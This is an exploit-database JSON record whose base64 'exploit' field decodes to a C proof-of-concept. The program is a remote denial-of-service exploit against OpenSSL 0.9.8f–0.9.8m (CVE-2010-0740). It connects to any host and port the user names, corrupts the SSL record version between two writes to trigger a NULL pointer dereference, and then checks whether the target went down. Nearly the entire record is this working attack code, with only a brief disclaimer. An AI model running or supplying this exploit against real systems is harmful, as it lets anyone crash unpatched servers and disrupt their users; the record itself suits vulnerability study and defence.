{
    "source": "exploit-database", 
    "exploit": "LyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQogKiBob2FnaWVfb3BlbnNzbF9yZWNvcmRfb2ZfZGVhdGguYw0KICogT1BFTlNTTCBSRU1PVEUgREVOSUFMLU9GLVNFUlZJQ0UgRVhQTE9JVCANCiAqIC0gT3BlblNTTCAwLjkuOG0gKHNob3J0ID0gMTYgYml0KQ0KICogLSBPcGVuU1NMIDAuOS44ZiB0aHJvdWdoIDAuOS44bSAoc2hvcnQgIT0gMTYgYml0KQ0KICoNCiAqIENWRS0yMDEwLTA3NDANCiAqDQogKiBCdWcgZGlzY292ZXJlZCBieToNCiAqIEJvZG8gTW9lbGxlciBhbmQgQWRhbSBMYW5nbGV5IChHb29nbGUpDQogKiBQaGlsaXAgT2xhdXNzb24gPHBvQHNlY3dlYi5zZT4NCiAqIGh0dHA6Ly9vcGVuc3NsLm9yZy9uZXdzL3NlY2Fkdl8yMDEwMDMyNC50eHQNCiAqDQogKiBUaGUgbWFpbiBwcm9ibGVtIGlzIGluIHNzbC90MV9lbmMuYyA9PiB0bHMxX21hYygpIGZ1bmN0aW9uDQogKg0KICogLSBPcGVuU1NMIDAuOS44bQ0KICogICAgICAgICBpZiAoc3NsLT52ZXJzaW9uID09IERUTFMxX0JBRF9WRVIgfHwNCiAqICAgICAgICAgICAoc3NsLT52ZXJzaW9uID09IERUTFMxX1ZFUlNJT04gJiYgc3NsLT5jbGllbnRfdmVyc2lvbiAhPSBEVExTMV9CQURfVkVSKSkNCiAqICAgICAgICAgICAgICAgew0KICogICAgICAgICAgICAgICB1bnNpZ25lZCBjaGFyIGR0bHNzZXFbOF0sKnA9ZHRsc3NlcTsNCiAqICAgICAgICAgICAgICAgczJuKHNlbmQ/c3NsLT5kMS0+d19lcG9jaDpzc2wtPmQxLT5yX2Vwb2NoLCBwKTsNCiAqDQogKiAtIE9wZW5TU0wgMC45LjhmIC0gMC45LjhuDQogKiAgICAgICAgIGlmIChzc2wtPnZlcnNpb24gPT0gRFRMUzFfVkVSU0lPTiAmJiBzc2wtPmNsaWVudF92ZXJzaW9uICE9IERUTFMxX0JBRF9WRVIpDQogKiAgICAgICAgICAgICAgIHsNCiAqICAgICAgICAgICAgICAgdW5zaWduZWQgY2hhciBkdGxzc2VxWzhdLCpwPWR0bHNzZXE7DQogKg0KICogICAgICAgICAgICAgICBzMm4oc2VuZD9zc2wtPmQxLT53X2Vwb2NoOnNzbC0+ZDEtPnJfZXBvY2gsIHApOw0KICoNCiAqIFRoZXJlIGlzIGEgTlVMTCBwb2ludGVyIGRlcmVmZXJlbmNlID0+IHNzbC0+ZDEgYmVjYXVzZSBkMSBpcyBvbmx5IGluaXRpYWxpemVkIGluDQogKiBzc2wvZDFfbGliLmMgPT4gZHRsczFfbmV3KCkuIFNvIGlmIHlvdSB1c2UgU1NMdjIzX3NlcnZlcl9tZXRob2QoKSBvciANCiAqIFRMU3YxX3NlcnZlcl9tZXRob2QoKSB0aGlzIHZhcmlhYmxlIHdpbGwgYmUgTlVMTC4NCiAqDQogKiBJZiB0aGUgcGF0Y2ggKHNlZSBodHRwOi8vb3BlbnNzbC5vcmcvbmV3cy9zZWNhZHZfMjAxMDAzMjQudHh0KSBpcyBub3QgYXBwbGllZA0KICogaXRzIHBvc3NpYmxlIHRvIHNldCB0aGUgdmVyc2lvbiB0byBEVExTMV9CQURfVkVSICgweDEwMCkgb3IgRFRMU19WRVJTSU9OICgweGZlZmYpDQogKiBhbmQgdHJhbnNtaXQgdGhlIHBhY2tldCB0byB0aGUgc2VydmVyIG9yIGNsaWVudCB0byB0cmlnZ2VyIHRoZSB2dWxuZXJhYmlsaXR5Lg0KICoNCiAqIFdoZW4geW91IGFyZSB1c2luZyBPcGVuU1NMIDAuOS44bSB5b3UgY2FuIHNlbmQgRFRMUzFfQkFEX1ZFUiBiZWNhdXNlIDB4MTAwIGlzIG5vdCANCiAqIGEgcHJvYmxlbSB3aXRoIHNpZ25lZC91bnNpZ25lZC4NCiAqDQogKiBJZiB5b3UgYXJlIHVzaW5nIE9wZW5TU0wgMC45LjhmIHRvIDAuOS44biB5b3UgaGF2ZSB0byB0cmlnZ2VyIHRoZSB2dWxuZXJhYmlsaXR5DQogKiB2aWEgRFRMUzFfVkVSU0lPTi4gSW4gdGhhdCBjYXNlIHZlcnNpb24gd2lsbCBiZSAweGZmZmZmZWZmLiBTbyBpdCBkb2VzbnQgd29yaw0KICogaWYgRFRMUzFfVkVSU0lPTiBpcyAxNiBiaXQuDQogKg0KICogVEhJUyBGSUxFIElTIEZPUiBTVFVEWUlORyBQVVJQT1NFUyBPTkxZIEFORCBBIFBST09GLU9GLQ0KICogQ09OQ0VQVC4gVEhFIEFVVEhPUiBDQU4gTk9UIEJFIEhFTEQgUkVTUE9OU0lCTEUgRk9SIEFOWQ0KICogREFNQUdFIERPTkUgVVNJTkcgVEhJUyBQUk9HUkFNLg0KICoNCiAqIFZPSUQuQVQgU2VjdXJpdHkNCiAqIGFuZGlAdm9pZC5hdA0KICogaHR0cDovL3d3dy52b2lkLmF0DQogKg0KICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPG5ldGRiLmg+DQojaW5jbHVkZSA8dGltZS5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8YXJwYS9pbmV0Lmg+DQojaW5jbHVkZSA8b3BlbnNzbC9zc2wuaD4NCg0KLyogdXNhZ2UNCiAqIGRpc3BsYXkgaGVscCBzY3JlZW4NCiAqLw0Kdm9pZCB1c2FnZShpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsNCiAgIGZwcmludGYoc3RkZXJyLA0KICAgICAgICAgICAidXNhZ2U6ICVzIFstaF0gWy12XSBbLWQgPGhvc3Q+XSBbLXAgPHBvcnQ+XVxuIg0KICAgICAgICAgICAiXG4iDQogICAgICAgICAgICItaCAgICAgICAgaGVscFxuIg0KICAgICAgICAgICAiLXYgICAgICAgIHZlcmJvc2VcbiINCiAgICAgICAgICAgIi1kIGhvc3QgICBTU0wgc2VydmVyXG4iDQogICAgICAgICAgICItcCBwb3J0ICAgU1NMIHBvcnRcbiINCiAgICAgICAgICAgIi10IHRhcmdldFxuIg0KICAgICAgICAgICAiICAgMCAuLi4gT3BlblNTTCAwLjkuOG0gKHNob3J0ID0gMTYgYml0KSAtIGRlZmF1bHRcbiINCiAgICAgICAgICAgIiAgIDEgLi4uIE9wZW5TU0wgMC45LjhmIHRocm91Z2ggMC45LjhtIChzaG9ydCAhPSAxNiBiaXQpXG4iDQogICAgICAgICAgICwNCiAgICAgICAgICAgYXJndlswXSk7DQogICBleGl0KDEpOw0KfQ0KDQovKiBjb25uZWN0X3RvDQogKiBjb25uZWN0IHRvIHJlbW90ZSBodHRwIHNlcnZlcg0KICovDQppbnQgY29ubmVjdF90byhjaGFyICpob3N0LCBpbnQgcG9ydCkgew0KICAgc3RydWN0IHNvY2thZGRyX2luIHNfaW47DQogICBzdHJ1Y3QgaG9zdGVudCAqaGU7DQogICBpbnQgczsNCg0KICAgaWYgKChzID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkpID09IC0xKSB7DQogICAgICByZXR1cm4gLTE7DQogICB9DQoNCiAgIG1lbXNldCgmc19pbiwgMCwgc2l6ZW9mKHNfaW4pKTsNCiAgIHNfaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICBzX2luLnNpbl9wb3J0ID0gaHRvbnMocG9ydCk7DQoNCiAgIGlmICggKGhlID0gZ2V0aG9zdGJ5bmFtZShob3N0KSkgIT0gTlVMTCkNCiAgICAgICBtZW1jcHkoJnNfaW4uc2luX2FkZHIsIGhlLT5oX2FkZHIsIGhlLT5oX2xlbmd0aCk7DQogICBlbHNlIHsNCiAgICAgICBpZiAoIChzX2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihob3N0KSApIDwgMCkgew0KICAgICAgICAgIHJldHVybiAtMzsNCiAgICAgICB9DQogICB9DQoNCiAgIGlmIChjb25uZWN0KHMsIChzdHJ1Y3Qgc29ja2FkZHIgKikmc19pbiwgc2l6ZW9mKHNfaW4pKSA9PSAtMSkgew0KICAgICAgcmV0dXJuIC00Ow0KICAgfQ0KDQogICByZXR1cm4gczsNCn0NCg0KLyogc3NsX2Nvbm5lY3RfdG8NCiAqIGVzdGFibGlzaCBzc2wgY29ubmVjdGlvbiBvdmVyIHRjcCBjb25uZWN0aW9uDQogKi8NClNTTCAqc3NsX2Nvbm5lY3RfdG8oaW50IHMpIHsNCiAgIFNTTCAqc3NsOw0KICAgU1NMX0NUWCAqY3R4Ow0KICAgQklPICpzYmlvOw0KICAgU1NMX01FVEhPRCAqbWV0aDsNCg0KICAgQ1JZUFRPX21hbGxvY19pbml0KCk7DQogICBTU0xfbG9hZF9lcnJvcl9zdHJpbmdzKCk7DQogICBTU0xfbGlicmFyeV9pbml0KCk7DQoNCiAgIC8vIG1ldGggPSBUTFN2MV9jbGllbnRfbWV0aG9kKCk7DQogICBtZXRoID0gU1NMdjIzX2NsaWVudF9tZXRob2QoKTsNCiAgIGN0eCA9IFNTTF9DVFhfbmV3KG1ldGgpOw0KICAgc3NsID0gU1NMX25ldyhjdHgpOw0KICAgc2JpbyA9IEJJT19uZXdfc29ja2V0KHMsIEJJT19OT0NMT1NFKTsNCiAgIFNTTF9zZXRfYmlvKHNzbCwgc2Jpbywgc2Jpbyk7DQoNCiAgIGlmIChTU0xfY29ubmVjdChzc2wpIDw9IDApIHsNCiAgICAgIHJldHVybiBOVUxMOw0KICAgfQ0KDQogICByZXR1cm4gc3NsOw0KfQ0KDQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgc3RydWN0IHNvY2thZGRyX2luIHNfaW47DQogICBzdHJ1Y3QgaG9zdGVudCAqaGU7DQogICBjaGFyIGRhdGFbMTAyNF07DQoNCiAgIGludCBzOw0KICAgaW50IHRhcmdldCA9IDA7DQogICBjaGFyIGM7DQogICBjaGFyICpkZXN0aW5hdGlvbiA9IE5VTEw7DQogICBpbnQgcG9ydCA9IDA7DQogICBTU0wgKnNzbCA9IE5VTEw7DQoNCiAgIGZwcmludGYoc3RkZXJyLA0KICAgICAgICAgICAiaG9hZ2llX29wZW5zc2xfcmVjb3JkX29mX2RlYXRoLmMgLSBvcGVuc3NsIHNzbDNfZ2V0X3JlY29yZCgpIHJlbW90ZVxuIg0KICAgICAgICAgICAiLWFuZGkgLyB2b2lkLmF0XG5cbiIpOw0KDQogICBpZiAoYXJnYyA8IDIpIHsNCiAgICAgIHVzYWdlKGFyZ2MsIGFyZ3YpOw0KICAgfSBlbHNlIHsNCiAgICAgIHdoaWxlICgoYyA9IGdldG9wdCAoYXJnYywgYXJndiwgImhkOnA6dDoiKSkgIT0gRU9GKSB7DQogICAgICAgICBzd2l0Y2ggKGMpIHsNCiAgICAgICAgICAgIGNhc2UgJ2gnOg0KICAgICAgICAgICAgICAgICB1c2FnZShhcmdjLCBhcmd2KTsNCiAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdkJzoNCiAgICAgICAgICAgICAgICAgZGVzdGluYXRpb24gPSBvcHRhcmc7DQogICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAncCc6DQogICAgICAgICAgICAgICAgIHBvcnQgPSBhdG9pKG9wdGFyZyk7DQogICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAndCc6DQogICAgICAgICAgICAgICAgIHRhcmdldCA9IGF0b2kob3B0YXJnKTsNCiAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICB9DQogICAgICB9DQoNCiAgICAgIGlmICghZGVzdGluYXRpb24gfHwgIXBvcnQpIHsNCiAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiWypdIGRlc3RpbmF0aW9uIGFuZC9vciBwb3J0IG1pc3NpbmdcbiIpOw0KICAgICAgfSBlbHNlIGlmICh0YXJnZXQgJiYgdGFyZ2V0ICE9IDEpIHsNCiAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiWypdIGludmFsaWQgdGFyZ2V0ICclZCdcbiIsIHRhcmdldCk7DQogICAgICB9IGVsc2Ugew0KICAgICAgICAgcyA9IGNvbm5lY3RfdG8oZGVzdGluYXRpb24sIHBvcnQpOw0KICAgICAgICAgaWYgKHMgPiAwKSB7DQogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlsrXSB0Y3AgY29ubmVjdGlvbiB0byAnJXM6JWQnIHN1Y2Nlc3NmdWxcbiIsIGRlc3RpbmF0aW9uLCBwb3J0KTsNCiAgICAgICAgICAgIHNzbCA9IHNzbF9jb25uZWN0X3RvKHMpOw0KICAgICAgICAgICAgaWYgKHNzbCkgew0KICAgICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJbK10gc3NsIGNvbm5lY3Rpb24gdG8gJyVzOiVkJyBzdWNjZXNzZnVsXG4iLCBkZXN0aW5hdGlvbiwgcG9ydCk7DQogICAgICAgICAgICAgICBzbnByaW50ZihkYXRhLCBzaXplb2YoZGF0YSksICJHRVQgLyBIVFRQLzEuMFxyXG5cclxuIik7DQoNCiAgICAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiWytdIHNlbmRpbmcgZmlyc3QgcGFja2V0IC4uLlxuIik7DQogICAgICAgICAgICAgICBTU0xfd3JpdGUoc3NsLCBkYXRhLCBzdHJsZW4oZGF0YSkpOw0KDQogICAgICAgICAgICAgICBpZiAoIXRhcmdldCkgew0KICAgICAgICAgICAgICAgICAgc3NsLT52ZXJzaW9uID0gRFRMUzFfQkFEX1ZFUjsNCiAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICBzc2wtPnZlcnNpb24gPSBEVExTMV9WRVJTSU9OOw0KICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlsrXSBzZW5kaW5nIHNlY29uZCBwYWtldCAuLi5cbiIpOw0KICAgICAgICAgICAgICAgU1NMX3dyaXRlKHNzbCwgZGF0YSwgc3RybGVuKGRhdGEpKTsNCg0KICAgICAgICAgICAgICAgU1NMX3NodXRkb3duKHNzbCk7DQogICAgICAgICAgICAgICBjbG9zZShzKTsNCg0KICAgICAgICAgICAgICAgc2xlZXAoMSk7DQoNCiAgICAgICAgICAgICAgIHMgPSBjb25uZWN0X3RvKGRlc3RpbmF0aW9uLCBwb3J0KTsNCiAgICAgICAgICAgICAgIGlmIChzID4gMCkgew0KICAgICAgICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJbLV0gZXhwbG9pdCBmYWlsZWRcbiIpOw0KICAgICAgICAgICAgICAgICAgY2xvc2Uocyk7DQogICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJbK10gZXhwbG9pdCBzdWNjZXNzZnVsXG4iKTsNCiAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlstXSBzc2wgY29ubmVjdGlvbiB0byAnJXM6JWQnIGZhaWxlZFxuIiwgZGVzdGluYXRpb24sIHBvcnQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiWy1dIHRjcCBjb25uZWN0aW9uIHRvICclczolZCcgZmFpbGVkXG4iLCBkZXN0aW5hdGlvbiwgcG9ydCk7DQogICAgICAgICB9DQogICAgICB9DQogICB9DQogICANCiAgIHJldHVybiAwOw0KfQ==", 
    "filename": "platforms/linux/dos/12334.c", 
    "id": "12334", 
    "cves": [
        "CVE-2010-0740"
    ]
}